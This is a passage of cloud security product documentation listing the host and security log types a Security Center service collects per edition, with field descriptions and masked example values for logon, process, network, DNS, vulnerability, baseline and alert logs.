The log analysis feature of Security Center provides centralized storage, query, and analysis of host activities and security events to facilitate security audits, event tracing, and threat discovery. This topic describes the log types that Security Center supports, the differences between editions, the log fields, and provides query examples.

## **Version support**

## **Subscription**

### **Host logs**

**Log categorization**

**Basic**

**Anti-virus**

**Advanced**

**Enterprise**

**Ultimate**

**Logon logs**

Not supported

Supported

Supported

Supported

Supported

**Network connection logs**

Not supported

Supported

Supported

Supported

Supported

**Process startup logs**

Not supported

Supported

Supported

Supported

Supported

**Brute-force attack logs**

Not supported

Supported

Supported

Supported

Supported

**DNS query logs**

Not supported

Supported

Supported

Supported

Supported

**Client event logs**

Supported

Supported

Supported

Supported

Supported

**Account snapshot logs**

Not supported

Not supported

Not supported

Supported

Supported

**Network snapshot logs**

Not supported

Not supported

Not supported

Supported

Supported

**Process snapshot logs**

Not supported

Not supported

Not supported

Supported

Supported

### **Security logs**

**Log categorization**

**Basic**

**Anti-virus**

**Advanced**

**Enterprise**

**Ultimate**

**Security alert logs**

Supported

**Note**

Only alerts supported by the Basic edition are recorded.

Supported

Supported

Supported

Supported

**Vulnerability logs**

Supported

**Note**

Only vulnerabilities supported by the Basic edition are recorded.

Supported

Supported

Supported

Supported

**Network defense logs**

Not supported

Supported

Supported

Supported

Supported

**Core file monitoring event logs**

Not supported

Not supported

Not supported

Supported

Supported

**CSPM - Baseline checks**

Not supported

Not supported

Supported

Supported

Supported

### **Value-added service logs**

If you enable the following value-added services, Security Center can analyze the logs that they generate.

-   **Malicious File Detection**
    
-   **Agentless Detection**
    
-   **Application Protection**
    
-   **CSPM**(**Baseline Check** logs and **CSPM** logs)
    

## **Pay-as-you-go service**

If you purchase the **Host and Container Security** pay-as-you-go service, the supported log types vary depending on the protection level that is bound to the server.

### **Host logs**

**Log categorization**

**Unprotected**

**Antivirus**

**Host Protection**

**Hosts and Container Protection**

**Logon logs**

Not supported

Supported

Supported

Supported

**Network connection logs**

Not supported

Supported

Supported

Supported

**Process startup logs**

Not supported

Supported

Supported

Supported

**Brute-force attack logs**

Not supported

Supported

Supported

Supported

**DNS query logs**

Not supported

Supported

Supported

Supported

**Client event logs**

Supported

Supported

Supported

Supported

**Account snapshot logs**

Not supported

Not supported

Supported

Supported

**Network snapshot logs**

Not supported

Not supported

Supported

Supported

**Process snapshot logs**

Not supported

Not supported

Supported

Supported

### **Security logs**

**Log categorization**

**Unprotected**

**Antivirus**

**Host Protection**

**Hosts and Container Protection**

**Security alert logs**

Supported

**Note**

Only alerts supported for the Unprotected level are recorded.

Supported

Supported

Supported

**Vulnerability logs**

Supported

**Note**

Only vulnerabilities that are not covered by a protection level are recorded.

Supported

Supported

Supported

**Network defense logs**

Not supported

Supported

Supported

Supported

**Core file monitoring event logs**

Not supported

Not supported

Supported

Supported

### **Pay-as-you-go Service Logs**

If you enable the following pay-as-you-go services, Security Center can analyze the logs that they generate.

-   **Malicious File Detection**
    
-   **Agentless Detection**
    
-   **Application Protection**
    
-   **CSPM**(**Baseline Check** logs and **CSPM** logs)
    

## Log type descriptions

**Note**

The following log samples and field descriptions are for reference only. The specific fields are subject to change with product updates. For the most accurate information, refer to the data collected in Simple Log Service.

## **Host logs**

-   [Logon logs](#eb0cf9d03clie)
    
    -   **\_\_topic\_\_**: `aegis-log-login`
        
    -   **Log content**: Records user logon events on servers, including the source IP address, username, and logon result.
        
    -   **Description**: Helps you monitor user activities and promptly identify and respond to abnormal behavior.
        
        **Important**
        
        Security Center does not support collecting **logon logs** for the Windows Server 2008 operating system.
        
    -   **Collection period:** Real-time.
        
-   [Network connection logs](#b90b64603cajt)
    
    -   **\_\_topic\_\_**: `aegis-log-network`
        
    -   **Log content**: Records network connection activities on the server in real time, including information such as the connection 5-tuple and associated processes.
        
    -   **Description**: Helps you discover abnormal connection behavior, identify potential network attacks, and optimize network performance.
        
        **Important**
        
        -   The server collects only some connection statuses from establishment to termination.
            
        -   Inbound traffic is not recorded.
            
        
    -   **Collection period:** Real-time.
        
-   [Process startup logs](#6b8dc4413cy9w)
    
    -   **\_\_topic\_\_**: `aegis-log-process`
        
    -   **Log content**: Records startup events for all new processes on the server, including information such as the process name, command-line parameters, and the parent process.
        
    -   **Description**: Helps you understand the startup status and configuration of processes in the system and detect issues such as abnormal process activities, malware intrusions, and security threats.
        
    -   **Collection period:** Real-time. Logs are reported immediately after a process starts.
        
-   [Brute-force attack logs](#47003e803c25r)
    
    -   **\_\_topic\_\_**: `aegis-log-crack`
        
    -   **Log content**: Records brute-force attack behavior, including attempts to log on to and crack systems, applications, or accounts.
        
    -   **Description**: Helps you identify brute-force attacks, detect abnormal logons, weak passwords, and credential leaks. These logs also support event response and forensic analysis.
        
    -   **Collection period**: Real-time.
        
-   [Account snapshot logs](#01a96e503cbnk)
    
    -   **\_\_topic\_\_**: `aegis-snapshot-host`
        
    -   **Log content**: Records detailed information about user accounts in a system or application, including basic account properties such as the username, password policy, and logon history.
        
    -   **Description**: By comparing snapshots from different points in time, you can monitor account changes and promptly detect security issues such as unauthorized access and abnormal account statuses.
        
    -   **Collection period**: Data is collected automatically at the interval that is set in Asset Fingerprints. If no interval is set, data is collected once a day. You can also manually collect data.
        
-   [Network snapshot logs](#24d464903csmj)
    
    -   **\_\_topic\_\_**: `aegis-snapshot-port`
        
    -   **Log content**: Records network connection information, including the connection 5-tuple, connection status, and associated processes.
        
    -   **Description**: Helps you understand the active network connections in your system, discover abnormal connection behavior, and identify potential network attacks.
        
    -   **Collection period**: Data is collected automatically at the interval that is set in Asset Fingerprints. If no interval is set, data is collected once a day. You can also manually collect data.
        
-   [Process snapshot logs](#24bb68e03ce37)
    
    -   **\_\_topic\_\_**: `aegis-snapshot-process`
        
    -   **Log content**: Records process activities in the system, including the process ID, name, and startup time.
        
    -   **Description**: Use these logs to understand process activities and resource usage, and detect issues such as abnormal processes, high CPU usage, and memory leaks.
        
    -   **Collection period**: Data is collected automatically at the interval that is set in Asset Fingerprints. If no interval is set, data is collected once a day. You can also manually collect data.
        
-   [DNS query logs](#532a81603cnvl)
    
    -   **\_\_topic\_\_**: `aegis-log-dns-query`
        
    -   **Log content**: Records DNS query requests that are initiated by the server, including information such as the queried domain name, query type, and source.
        
        **Important**
        
        Log collection is not supported for Linux servers with a kernel version earlier than 4.X.X.
        
    -   **Description**: Use these logs to analyze DNS activities and detect issues such as abnormal queries, domain hijacking, and DNS pollution.
        
    -   **Collection period**: Real-time.
        
-   [Agent event logs](#b9967ccf22ivr)
    
    -   **\_\_topic\_\_**: `aegis-log-client`
        
    -   **Log content**: Records the online and offline events of the Security Center agent.
        
    -   **Description**: Helps you monitor the running status of the Security Center agent.
        
    -   **Collection period**: Real-time.
        

### **Security logs**

**Important**

All security logs are collected in real time.

-   [Vulnerability logs](#86e9c9003c0xj)
    
    -   **\_\_topic\_\_**: `sas-vul-log`
        
    -   **Log content**: Records information about vulnerabilities found in your systems or applications, including the vulnerability name, status, and handling action.
        
    -   **Description**: Helps you understand the vulnerabilities, security risks, and attack trends in your system so that you can take timely remediation measures.
        
-   [CSPM - Baseline check logs](#6ba726303ceg8)
    
    -   **\_\_topic\_\_**: `sas-hc-log`
        
    -   **Log content**: Records the results of baseline risk checks, including information such as the baseline level, category, and risk level.
        
        **Important**
        
        Only data for check items that fail for the first time is recorded. Data for check items that previously passed but now fail a new check is also recorded.
        
    -   **Description**: Helps you understand the baseline security status and potential risks of your system.
        
-   [Security alert logs](#f7bfb2203c21n)
    
    -   **\_\_topic\_\_**: `sas-security-log`
        
    -   **Log content**: Records security events and alerts that occur in your system or application, including the alert data source, details, and alert level.
        
    -   **Description**: Helps you understand the security events and threats in your system so that you can take appropriate response measures.
        
-   [CSPM - Cloud platform configuration check logs](#ca19aea03c889)
    
    -   **\_\_topic\_\_**: `sas-cspm-log`
        
    -   **Log content**: Records information such as cloud platform configuration check results and whitelisting operations.
        
    -   **Description**: Helps you understand configuration issues and potential security risks in your cloud platform.
        
-   [Network defense logs](#44c6b3f066npm)
    
    -   **\_\_topic\_\_**: `sas-net-block`
        
    -   **Log content**: Records network attack events, including key information such as the attack type and source/destination IP addresses.
        
    -   **Description**: Helps you understand security events on your network so that you can take response and defense measures to improve network security.
        
-   [Application protection logs](#8e54f1dff2ynf)
    
    -   **\_\_topic\_\_**: `sas-rasp-log`
        
    -   **Log content**: Records attack alert information from Runtime Application Self-Protection (RASP), including the attack type, behavioral data, and attacker IP address.
        
    -   **Description**: Helps you understand security events in your application so that you can take response and defense measures to improve application security.
        
-   [Malware detection logs](#63133f2fe5psy)
    
    -   **Topic**: `sas-filedetect-log`
        
    -   **Log content**: Records detection results from the malware detection software development kit (SDK), including file information, detection scenario, and results.
        
    -   **Description**: Helps you identify and promptly handle malicious programs in offline files or cloud storage.
        
-   [Core file monitoring event logs](#7cd3b290a5fs9)
    
    -   **Topic**: `aegis-file-protect-log`
        
    -   **Log content**: Records alert events detected by the core file monitoring feature, including the file path, operation type, and alert level.
        
    -   **Description**: Helps you monitor whether core files are stolen or tampered with.
        
-   [Agentless detection logs](#ecf648a4f10tc)
    
    -   **\_\_topic\_\_**: `sas-agentless-log`
        
    -   **Log content**: Records security risks detected in cloud servers, disk snapshots, and images. These risks include vulnerabilities, baselines, malicious samples, and sensitive files.
        
    -   **Description**: Helps you view the security risk status of your assets over different time periods to identify and respond to potential threats.
        

## **Host log fields**

### **Logon logs**

**Field name**

**Description**

**Example**

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

sas\_group\_name

The asset group of the server in Security Center.

default

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

src\_ip

IP address of the server to log on to.

221.11.XX.XX

dst\_port

The logon port of the server.

22

login\_type

The logon type. Valid values include but are not limited to:

-   **SSHLOGIN**, **SSH**: SSH logon.
    
-   **RDPLOGIN**: Remote desktop logon.
    
-   **IPCLOGIN**: IPC connection logon.
    

SSH

username

The logon username.

admin

login\_count

The number of logons.

Repeated logons within one minute are merged into a single log entry. For example, if the value of `login_count` is **3**, it indicates three repeated logons within the last minute.

3

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Network connection logs**

**Field name**

**Description**

**Example**

cmd\_chain

The process chain.

\[

{

"9883":"bash -c kill -0 -- -'6274'"

}

......

\]

cmd\_chain\_index

The index of the process chain. Use the index to look up the process chain.

B184

container\_hostname

The server name in the container.

nginx-ingress-controller-765f67fd4d-\*\*\*\*

container\_id

The container ID.

4181de1e2b20c3397f1c409266dbd5631d1bc5be7af85246b0d\*\*\*\*

container\_image\_id

The image ID.

registry-cn-beijing-vpc.ack.aliyuncs.com/acs/aliyun-ingress-controller@sha256:5f281994d9e71a1b1a087365271024991c5b0d0543c48f0\*\*\*\*

container\_image\_name

The image name.

registry-cn-beijing-vpc.ack.aliyuncs.com/acs/aliyun-ingress-\*\*\*\*

container\_name

The container name.

nginx-ingress-\*\*\*\*

container\_pid

The process ID in the container.

0

net\_connect\_dir

The direction of the network connection. Valid values:

-   **in**: Inbound.
    
-   **out**: Outbound.
    

in

dst\_ip

The IP address of the network connection receiver.

-   If **dir** is **out**, this is the peer host.
    
-   If **dir** is **in**, this is the local host.
    

192.168.XX.XX

dst\_port

The port of the network connection receiver.

443

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

parent\_proc\_name

The filename of the parent process.

/usr/bin/bash

pid

The process ID.

14275

ppid

The parent process ID.

14268

proc\_name

The process name.

nginx

proc\_path

The process path.

/usr/local/nginx/sbin/nginx

proc\_start\_time

The startup time of the process.

N/A

connection\_type

The protocol. Valid values:

-   **tcp**.
    
-   **raw** (indicates a raw socket).
    

tcp

sas\_group\_name

The asset group of the server in Security Center.

default

src\_ip

The source IP address.

100.127.XX.XX

src\_port

The source port.

41897

srv\_comm

The command name associated with the grandparent process.

containerd-shim

status

The network connection status. Valid values:

-   **1**: Closed.
    
-   **2**: Listening for connection requests.
    
-   **3**: SYN sent.
    
-   **4**: SYN received.
    
-   **5**: Established.
    
-   **6**: Close wait.
    
-   **7**: Closing.
    
-   **8**: FIN wait 1.
    
-   **9**: FIN wait 2.
    
-   **10**: Allow sufficient time for the peer to acknowledge the shutdown request (time\_wait).
    
-   **11**: TCB deleted.
    

5

type

The type of real-time network connection. Valid values:

-   **connect**: An active TCP connection is initiated.
    
-   **accept**: A TCP connection is received.
    
-   **listen**: The port is in the listening state.
    

listen

uid

The ID of the process user.

101

username

The username of the process.

root

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Process startup logs**

**Field Name**

**Description**

**Example**

cmd\_chain

The process chain.

\[

{

"9883":"bash -c kill -0 -- -'6274'"

}

......

\]

cmd\_chain\_index

The index of the process chain. Use the index to look up the process chain.

B184

cmd\_index

The index of each parameter in the command line. Each pair of indexes indicates the start and end of a parameter.

0,3,5,8

cmdline

The full command line for starting the process.

ipset list KUBE-6-CLUSTER-IP

comm

The command name associated with the process.

N/A

container\_hostname

The server name in the container.

nginx-ingress-controller-765f67fd4d-\*\*\*\*

container\_id

The container ID.

4181de1e2b20c3397f1c409266dbd5631d1bc5be7af85246b0d\*\*\*\*

container\_image\_id

The image ID.

registry-cn-beijing-vpc.ack.aliyuncs.com/acs/aliyun-ingress-controller@sha256:5f281994d9e71a1b1a087365271024991c5b0d0543c48f0\*\*\*\*

container\_image\_name

The image name.

registry-cn-beijing-vpc.ack.aliyuncs.com/acs/aliyun-ingress-\*\*\*\*

container\_name

The container name.

nginx-ingress-\*\*\*\*

container\_pid

The process ID in the container.

0

cwd

The directory where the process is running.

N/A

proc\_name

The process filename.

ipset

proc\_path

The full path of the process file.

/usr/sbin/ipset

gid

The ID of the process group.

0

groupname

The user group.

group1

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

parent\_cmd\_line

The command line of the parent process.

/usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=cn-beijing.192.168.XX.XX

parent\_proc\_name

The parent process filename.

kube-proxy

parent\_proc\_path

The full path of the parent process file.

/usr/local/bin/kube-proxy

pid

The process ID.

14275

ppid

The parent process ID.

14268

proc\_start\_time

The process startup time.

2024-08-01 16:45:40

parent\_proc\_start\_time

The startup time of the parent process.

2024-07-12 19:45:19

sas\_group\_name

The asset group of the server in Security Center.

default

srv\_cmd

The command line of the grandparent process.

/usr/bin/containerd

tty

The logon terminal. **N/A** indicates that the account has never logged on to a terminal.

N/A

uid

The user ID.

123

username

The username of the process.

root

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Brute-force attack logs**

**Field name**

**Description**

**Example**

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server that is subject to brute-force attacks.

192.168.XX.XX

sas\_group\_name

The asset group of the server in Security Center.

default

uuid

The UUID of the server that is subject to brute-force attacks.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*\*

login\_count

The number of failed logons.

Repeated logons within one minute are merged into a single log entry. For example, if the value of `warn_count` is **3**, it indicates three repeated logons within the last minute.

3

src\_ip

The source IP address for the logon.

47.92.XX.XX

dst\_port

The logon port.

22

login\_type

The logon type. Valid values:

-   **SSHLOGIN**, **SSH**: SSH logon.
    
-   **RDPLOGIN**: Remote desktop logon.
    
-   **IPCLOGIN**: IPC connection logon.
    
-   **SQLSERVER**: SQL Server logon failed.
    

SSH

username

The logon username.

user

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Account snapshot logs**

**Field Name**

**Description**

**Example**

account\_expire

The expiration time of the account. **never** indicates that the account never expires.

never

domain

The domain or directory service to which the account belongs. **N/A** indicates that the account does not belong to any domain.

N/A

groups

The group to which the account belongs. **N/A** indicates that the account does not belong to any group.

\["nscd"\]

home\_dir

The home directory. This is the default location for storing and managing files in the system.

/Users/abc

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

last\_chg

The date when the password was last changed.

2022-11-29

last\_logon

The date and time of the last logon to the account. **N/A** indicates that the account has never been logged on to.

2023-08-18 09:21:21

login\_ip

The remote IP address of the last logon to the account. **N/A** indicates that the account has never been logged on to.

192.168.XX.XX

passwd\_expire

The expiration date of the password. **never** indicates that the password never expires.

2024-08-24

perm

Indicates whether the account has root permissions. Valid values:

-   **0**: The account does not have root permissions.
    
-   **1**: The account has root permissions.
    

0

sas\_group\_name

The asset group of the server in Security Center.

default

shell

The Linux shell command.

/sbin/nologin

status

The status of the user account. Valid values:

-   **0**: The account is prohibited from logging on.
    
-   **1**: The account can log on normally.
    

0

tty

The logon terminal. **N/A** indicates that the account has never logged on to a terminal.

N/A

username

The username.

nscd

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

warn\_time

The date for the password expiration reminder. **never** indicates that a reminder is never sent.

2024-08-20

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Network snapshot logs**

**Field name**

**Description**

**Example**

net\_connect\_dir

The direction of the network connection. Valid values: **in** — inbound.

in

dst\_ip

The IP address of the peer, which is generally empty.

dst\_port

The port of the network connection receiver.

443

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

pid

The process ID.

682

proc\_name

The process name.

sshd

connection\_type

The protocol. Valid values:

-   **tcp4**: TCP connection over IPv4.
    
-   **tcp6**: TCP connection over IPv6.
    

tcp4

sas\_group\_name

The asset group of the server in Security Center.

default

src\_ip

The local IP address.

100.127.XX.XX

src\_port

The listening port.

41897

status

The value 2 indicates that the port is listening (listen), and the associated src\_ip/src\_port represents the listening address.

5

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Process snapshot logs**

**Field Name**

**Description**

**Example**

cmdline

The full command line for starting the process.

/usr/local/share/assist-daemon/assist\_daemon

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

md5

The MD5 hash of the binary file.

**Note**

The MD5 hash is not calculated for process files larger than 1 MB.

1086e731640751c9802c19a7f53a64f5

proc\_name

The process filename.

assist\_daemon

proc\_path

The full path of the process file.

/usr/local/share/assist-daemon/assist\_daemon

pid

The process ID.

1692

pname

The parent process filename.

systemd

sas\_group\_name

The asset group of the server in Security Center.

default

proc\_start\_time

The process startup time. This is a built-in field.

2023-08-18 20:00:12

uid

The ID of the process user.

101

username

The username of the process.

root

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **DNS query logs**

**Field Name**

**Description**

**Example**

domain

The domain name corresponding to the DNS query.

example.aliyundoc.com

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

host\_ip

The IP address of the server that initiated the DNS query.

192.168.XX.XX

pid

The process ID that initiated the DNS query.

3544

ppid

The parent process ID that initiated the DNS query.

3408

cmd\_chain

The process chain that initiated the DNS query.

"3544":"\\"C:\\\\Program Files (x86)\\\\Alibaba\\\\Aegis\\\\AliDetect\\\\AliDetect.exe\\""

cmdline

The command line that initiated the DNS query.

C:\\Program Files (x86)\\Alibaba\\Aegis\\AliDetect\\AliDetect.exe

proc\_path

The path of the process that initiated the DNS query.

C:/Program Files (x86)/Alibaba/Aegis/AliDetect/AliDetect.exe

sas\_group\_name

The asset group of the server in Security Center.

default

time

The time when the DNS query event was captured. This time is generally the same as the time when the DNS query occurred.

2023-08-17 20:05:04

uuid

The UUID of the server that initiated the DNS query.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### Client event logs

**Field Name**

**Description**

**Example**

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

host\_ip

The IP address of the server.

192.168.XX.XX

agent\_version

Client version

aegis\_11\_91

last\_login

The timestamp of the last logon. Unit: milliseconds.

1716444387617

platform

The operating system type. Valid values:

-   windows
    
-   linux
    

linux

region\_id

The region ID where the server resides.

cn-beijing

status

The agent status. Valid values:

-   online
    
-   offline
    

online

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

## **Security log fields**

### **Vulnerability logs**

**Field Name**

**Description**

**Example**

vul\_alias\_name

The alias of the vulnerability.

CESA-2023:1335: openssl Security Update

risk\_level

The risk level. Valid values:

-   **asap**: High
    
-   **Later**: Medium
    
-   **nntf**: Low
    

later

extend\_content

The extended information about the vulnerability.

{"cveList":\["CVE-2023-0286"\],"necessity":{"gmt\_create":"20230816","connect\_cnt":80,"total\_score":0.0,"assets\_factor":1.0,"enviroment\_factor":1.5,"status":"normal"},"os":"centos","osRelease":"7","preCheck":{},"rpmCanUpdate":true,"rpmEntityList":\[{"fullVersion":"1.0.2k-25.el7\_9","kernel":false,"matchDetail":"openssl-libs version less than 1.0.2k-26.el7\_9","matchList":\["openssl-libs version less than 1.0.2k-26.el7\_9"\],"name":"openssl-libs","nextResult":false,"path":"/etc/pki/tls","result":true,"updateCmd":"yum update openssl-libs","version":"1.0.2k-25.el7\_9"},{"fullVersion":"1.0.2k-25.el7\_9","kernel":false,"matchDetail":"openssl version less than 1.0.2k-26.el7\_9","matchList":\["openssl version less than 1.0.2k-26.el7\_9"\],"name":"openssl","nextResult":false,"path":"/etc/pki/CA","result":true,"updateCmd":"yum update openssl","version":"1.0.2k-25.el7\_9"}\]}

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

internet\_ip

The public IP address of the asset.

39.104.XX.XX

intranet\_ip

The private IP address of the asset.

192.168.XX.XX

instance\_name

The hostname.

hhht-linux-\*\*\*

vul\_name

The name of the vulnerability.

centos:7:cesa-2023:1335

operation

The action performed on the vulnerability. Valid values:

-   **new**: New
    
-   **verify**: Verify
    
-   **fix**: Fix
    

new

status

The status. Valid values:

-   **1**: Unfixed
    
-   **2**: Fix failed
    
-   **3**: Rollback failed
    
-   **4**: Fixing
    
-   **5**: Rolling back
    
-   **6**: Verifying
    
-   **7**: Fixed
    
-   **8**: Fixed, restart required
    
-   **9**: Rolled back
    
-   **10**: Ignored
    
-   **11**: Rolled back, restart required
    
-   **12**: Does not exist
    
-   **13**: Invalid
    

1

tag

The tag of the vulnerability. Valid values:

-   **oval**: Linux software vulnerability
    
-   **system**: Windows system vulnerability
    
-   **cms**: Web-CMS vulnerability
    
    **Note**
    
    The tags for other vulnerability types are random strings.
    

oval

type

The vulnerability type. Valid values:

-   **sys**: Windows system vulnerability
    
-   **cve**: Linux software vulnerability
    
-   **cms**: Web-CMS vulnerability
    
-   **emg**: Urgent vulnerability
    

sys

uuid

The server UUID.

ad66133a-dc82-4e5e-9659-a49e3\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **CSPM - Baseline check logs**

**Field name**

**Description**

**Example**

check\_item\_name

The name of the check item.

Set minimum interval for password changes

check\_item\_level

The check level of the baseline. Valid values:

-   **high**: High
    
-   **Medium**: Medium severity.
    
-   **low**: Low
    

medium

check\_type

The type of the check item.

Identity authentication

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

risk\_level

The risk level of the risk item. Valid values:

-   **high**: High
    
-   **medium**: Medium.
    
-   **low**: Low
    

medium

operation

The operation. Valid values:

-   **new**: New
    
-   **verity**: validation.
    

new

risk\_name

The name of the risk item.

Password policy compliance check

sas\_group\_name

The asset group of the server on which the risk item is detected in Security Center.

default

status

The status. Valid values:

-   1: Failed
    
-   2: Verifying
    
-   6: Ignored
    
-   7: Fixing
    

1

sub\_type\_alias\_name

The alias of the subtype.

International security best practices - Ubuntu 16/18/20/22 security baseline check

sub\_type\_name

The name of the baseline subtype. For more information about the valid values of the baseline subtype, see [List of baseline types and subtypes](/help/en/security-center/user-guide/log-fields-cloud-security#p-uzz-z9n-y7e).

hc\_ubuntu16\_cis\_rules

type\_alias\_name

The alias of the type.

International security best practices

type\_name

The baseline type. For valid values of the baseline type, see [List of baseline types and subtypes](/help/en/security-center/user-guide/log-fields-cloud-security#p-uzz-z9n-y7e).

cis

uuid

The UUID of the server on which the risk item is detected.

1ad66133a-dc82-4e5e-9659-a49e3\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### **Security alert logs**

**Field name**

**Description**

**Example**

data\_source

The data source. Valid values:

-   **aegis\_suspicious\_event**: Anomalous activity on the host
    
-   **aegis\_suspicious\_file\_v2**: Webshell
    
-   **aegis\_login\_log**: Anomalous logon
    
-   **honeypot**: Cloud honeypot alert event
    
-   **object\_scan**: File detection anomaly
    
-   **security\_event**: Security Center anomaly
    
-   **sas\_ak\_leak**: AK leak event
    

aegis\_login\_log

detail

A JSON object that provides detailed context for the alert. The fields in this object vary based on the alert type.

The following describes common fields of the `detail` object, such as `**alert_reason**` **(Reason for anomaly)**:

-   reason1: The IP address is not from a common logon location.
    
-   reason2: The API call failed.
    
-   reason3: The IP address is not from a common logon location and the API call failed.
    

{"loginSourceIp":"221.11.XX.XX","loginDestinationPort":22,"loginUser":"root","protocol":2,"protocolName":"SSH","clientIp":"192.168.XX.XX","loginTimes":1,"location":"Xi'an","type":"login\_common\_account","displayEventName":"Unusual Account Logon to ECS","status":0}

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

internet\_ip

The public IP address of the asset.

39.104.XX.XX

intranet\_ip

The private IP address of the asset.

192.168.XX.XX

level

The risk level of the alert event. Valid values:

-   **serious**: Urgent
    
-   **suspicious**: Suspicious.
    
-   **remind**: Reminder
    

suspicious

name

The alert name.

Anomalous Logon - Unusual Account Logon to ECS

operation

The operation. Valid values:

-   **new**: New
    
-   **dealing**: Processing
    
-   **update**: Updated
    

new

status

The status of the alert. Valid values:

-   **1**: Unhandled. New alerts have this status.
    
-   **2**: Ignored. The alert has this status after you ignore it in the console.
    
-   **8**: Whitelisted. The alert has this status after you add it to the whitelist in the console.
    
-   **16**: Processing. The alert has this status when it is being processed, for example, by terminating a process, quarantining a file, or adding it to the whitelist in the console.
    
-   **32**: Processed. The alert has this status after you mark it as manually processed or after a processing action, such as terminating a process or quarantining a file, is completed in the console.
    
-   **64**: Expired. An alert that is not processed within 30 days is marked as expired.
    
-   **513**: Automatically blocked. The alert was automatically blocked by the precise defense feature of Security Center and requires no manual action.
    

1

unique\_info

The unique identifier of the alert.

2536dd765f804916a1fa3b9516b5\*\*\*\*

uuid

The UUID of the server that generated the alert.

ad66133a-dc82-4e5e-9659-a49e3\*\*\*\*

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

suspicious\_event\_id

The alert event ID.

650226318

handle\_time

The time corresponding to the operation.

1765272845

alert\_first\_time

The time when the alert first occurred.

1764226915

alert\_last\_time

The time when the alert last occurred.

1765273425

strict\_mode

Indicates whether the alert is a strict mode alert. Valid values: true, false.

true

user\_id

The account ID.

1358\*\*\*\*\*\*3357

### **CSPM - Cloud platform configuration check logs**

**Field name**

**Description**

**Example**

check\_id

The ID of the check item. You can call the [ListCheckResult](/help/en/security-center/developer-reference/api-sas-2018-12-03-listcheckresult#main-107864) operation to obtain the ID.

11

check\_item\_name

The name of the check item.

Origin fetch configuration

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

instance\_name

The instance name.

lsm

instance\_result

The impact of the risk. The value is a JSON string.

{"Checks":\[{}\],"Columns":\[{"key":"RegionIdShow","search":true,"searchKey":"RegionIdKey","showName":"Region","type":"text"},{"key":"InstanceIdShow","search":true,"searchKey":"InstanceIdKey","showName":"Instance ID","type":"link"},{"key":"InstanceNameShow","search":true,"searchKey":"InstanceNameKey","showName":"Instance Name","type":"text"}\]}

instance\_sub\_type

The subtype of the instance. Valid values:

-   If the instance type is **ECS**, valid values of the subtype are:
    
    -   **INSTANCE**
        
    -   **DISK**
        
    -   **SECURITY\_GROUP**
        
-   If the instance type is **ACR**, valid values of the subtype are:
    
    -   **REPOSITORY\_ENTERPRISE**
        
    -   **REPOSITORY\_PERSON**
        
-   If the instance type is **RAM**, valid values of the subtype are:
    
    -   **ALIAS**
        
    -   **USER**
        
    -   **POLICY**
        
    -   **GROUP**
        
-   If the instance type is **WAF**, the subtype is **DOMAIN**.
    
-   If the instance type is another value, the subtype is **INSTANCE**.
    

INSTANCE

instance\_type

The instance type. Valid values:

-   **ECS**: Elastic Compute Service
    
-   **SLB**: Server Load Balancer
    
-   **RDS**: ApsaraDB RDS
    
-   **MONGODB**: MongoDB
    
-   **KVSTORE**: Redis
    
-   **ACR**: Container Registry
    
-   **CSK**: CSK
    
-   **VPC**: Virtual Private Cloud
    
-   **ActionTrail** is an operation audit service.
    
-   **CDN** stands for content delivery network.
    
-   **CAS**: Certificate Management Service
    
-   **RDC**: Apsara Devops
    
-   **RAM**: Resource Access Management
    
-   **DDOS**: Anti-DDoS
    
-   **WAF**: Web Application Firewall
    
-   **OSS**: Object Storage Service
    
-   **POLARDB**: PolarDB
    
-   **POSTGRESQL**: PostgreSQL
    
-   **MSE**: Microservices Engine
    
-   **NAS** is file storage.
    
-   **SDDP**: Sensitive Data Discovery and Protection
    
-   **EIP**: Elastic IP Address
    

ECS

region\_id

The region ID where the instance resides.

cn-hangzhou

requirement\_id

